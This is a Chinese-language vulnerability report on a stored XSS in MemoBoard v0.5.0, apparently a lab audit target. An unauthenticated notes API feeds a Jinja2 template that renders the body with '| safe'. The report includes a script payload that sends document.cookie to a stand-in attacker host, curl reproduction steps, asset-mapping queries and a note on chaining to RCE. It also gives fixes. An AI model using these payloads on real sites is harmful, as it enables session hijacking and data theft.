## 摘要

MemoBoard 的备忘录创建接口 `POST /api/notes` 无需认证，备忘录 body 内容被原样存入数据库。公开页面 `GET /notes` 使用 Jinja2 的 `| safe` 过滤器渲染 body，跳过 HTML 转义，导致存储型 XSS。攻击者可注入恶意 JavaScript，在其他用户（含 admin）访问公开备忘录页面时执行，实现会话劫持等攻击。

## 漏洞描述

MemoBoard 是一款基于 Flask 3.0.3 框架开发的内网备忘录看板应用。应用提供 `POST /api/notes` 接口用于创建备忘录，该接口无任何身份认证要求，匿名用户即可创建。备忘录的 body 字段被原样存入 SQLite 数据库。

公开页面 `GET /notes` 使用 Jinja2 模板 `templates/notes.html` 渲染所有备忘录。其中 body 字段使用 `{{ n.body | safe }}` 渲染，`| safe` 过滤器跳过了 Jinja2 默认的 HTML 自动转义。攻击者可在 body 中注入 `<script>` 标签等 HTML/JavaScript 代码，当其他用户（包括管理员）访问 `/notes` 页面时，恶意脚本在其浏览器中执行，构成存储型 XSS。

## 漏洞危害

- **存储型 XSS**：恶意脚本持久化存储在数据库中，任何访问 `/notes` 页面的用户都会触发执行。
- **会话劫持**：注入 `document.cookie` 窃取脚本可盗取其他用户（含 admin）的 Flask session cookie，实现会话劫持。
- **代操作**：以受害者身份执行操作（创建备忘录、访问 ping 接口等）。
- **攻击面广**：`/notes` 为公开页面，所有内网用户可见。

## 漏洞厂商全称

MemoBoard（VulnHunter 白盒审计靶场项目）

## 已知受影响产品及版本

MemoBoard v0.5.0（board/__init__.py `__version__ = "0.5.0"`）

## 互联网资产证明
> 用于在公开资产测绘平台定位同类应用资产；优先使用应用自身稳定特征，不把漏洞路径、PoC 参数或一次性业务数据当作唯一指纹。测绘语句不允许出现「或」关系。

### 精准测绘语法

#### FOFA
```text
title="MemoBoard notes" && icon_hash="-151231234" && body="MemoBoard"
```

#### X 情报社区
```text
title="MemoBoard notes" && app="MemoBoard notes" && icon_hash="-151231234"
```

## 漏洞技术细节

### 写入点（Source）

`POST /api/notes`（`src/app.py` 第 87-94 行）：

```python
@app.post("/api/notes")
def api_create_note():
    payload = request.get_json(silent=True) or {}
    title = str(payload.get("title") or request.form.get("title") or "untitled")
    body = str(payload.get("body") or request.form.get("body") or "")
    author = str(payload.get("author") or request.form.get("author") or "anonymous")
    note_id = create_note(author=author, title=title, body=body)
    return jsonify({"id": note_id, "ok": True}), 201
```

body 参数无任何过滤或转义，通过 `create_note` 参数化插入数据库（store.py:42-49）。

### 渲染点（Sink）

`GET /notes`（`src/app.py` 第 37-39 行）→ `templates/notes.html` 第 18 行：

```html
<div class="body">{{ n.body | safe }}</div>
```

`| safe` 过滤器标记内容为安全，跳过 Jinja2 自动转义。body 中的 HTML/JavaScript 原样输出到页面。

### 漏洞代码

- 完整路径：`src/templates/notes.html:18`

```html
<div class="body">{{ n.body | safe }}</div>
```

### 攻击路径

1. 匿名 POST `/api/notes` 创建备忘录，body 设为 `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`
2. 其他用户（含 admin）访问 `GET /notes`
3. 浏览器执行注入的 JavaScript，会话 cookie 被发送到攻击者服务器
4. 攻击者使用窃取的 admin session cookie 访问 ping 接口（RCE）

## 同根因受影响点

- `src/templates/notes.html:18` — `{{ n.body | safe }}` 使用 safe 过滤器跳过转义（主报告点）
- `src/app.py:87-94` — `api_create_note` 路由，无鉴权，body 未过滤直接存入数据库（写入点）
- `src/app.py:37-39` — `notes_page` 路由，渲染含未转义 body 的模板（渲染点）

## 复现证明

```bash
# 1. 创建含 XSS payload 的备忘录（无需认证）
curl -X POST http://TARGET:5000/api/notes \
  -H "Content-Type: application/json" \
  -d '{"title":"test","body":"<script>alert(document.cookie)</script>","author":"anonymous"}'

# 预期响应: {"id":3,"ok":true}

# 2. 访问公开备忘录页面
curl http://TARGET:5000/notes

# 预期: HTML 中包含未转义的 <script>alert(document.cookie)</script>
# 其他用户访问时浏览器执行该脚本

# 3. 使用 PoC 脚本
python poc.py -u http://TARGET:5000
```

## 修复方案

1. 移除 `| safe` 过滤器，使用 Jinja2 默认自动转义：
```html
<div class="body">{{ n.body }}</div>
```
2. 如需允许部分 HTML，使用 `bleach` 等库进行白名单过滤。
3. 为 `POST /api/notes` 添加身份认证。

## 备注

此漏洞为独立漏洞，不依赖其他漏洞作为前提。攻击者可利用存储型 XSS 盗取 admin 会话 cookie，进而访问 ping 接口触发 RCE，形成 XSS → admin 会话劫持 → RCE 的攻击链。

---

## 审核标注

- 攻击面：前台
- 配置前提：默认配置
- 严重度：高危（high）
- 校准得分：3
- 可达性：未认证可达
- 影响范围：敏感数据泄露/权限提升/部分数据
- 利用复杂度：单请求或简单触发
- 防护状态：无有效防护
- 价值分层：有 CVE 价值（cve_candidate）
- 分层理由：Stored XSS: anonymous attacker injects persistent JavaScript via unauthenticated POST /api/notes, which executes in every visitor's browser (including admin) on the public /notes page. The | safe filter in notes.html:18 disables Jinja2 auto-escaping. Can steal admin session cookies and chain to RCE via admin ping endpoint. Clear, independently exploitable, CVE-worthy impact.
- 根因合并键：stored_xss:notes.html
